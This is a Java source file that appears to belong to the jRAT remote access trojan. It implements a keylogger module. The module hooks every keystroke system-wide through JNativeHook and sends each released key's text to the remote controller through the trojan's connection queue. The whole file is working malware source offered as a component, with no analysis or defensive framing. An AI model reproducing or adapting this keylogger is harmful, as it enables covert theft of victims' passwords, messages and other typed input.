package jrat.module.keys;

import jrat.client.Connection;
import jrat.common.listeners.ConnectionListener;
import jrat.module.keys.packets.PacketKey;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener, ConnectionListener {

    public static Keylogger instance;

    private Connection con;

    public Keylogger(Connection con) {
        this.con = con;
    }

    /**
     * Registers this key listener
     */
    public void start() {
        if (instance != null) {
            System.err.println("instance already set");
        }

        instance = this;

        con.addConnectionListener(this);
        GlobalScreen.addNativeKeyListener(this);
    }

    /**
     * Unregisters this key listener
     */
    public void stop() {
        GlobalScreen.removeNativeKeyListener(this);
        instance = null;
    }

	public void nativeKeyPressed(NativeKeyEvent e) {

	}

	public void nativeKeyReleased(NativeKeyEvent e) {
        String text = NativeKeyEvent.getKeyText(e.getKeyCode());

        con.addToSendQueue(new PacketKey(text));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {

    }

    public void onDisconnect(Exception ex) {
        this.stop();
        con.removeConnectionListener(this);
    }
}
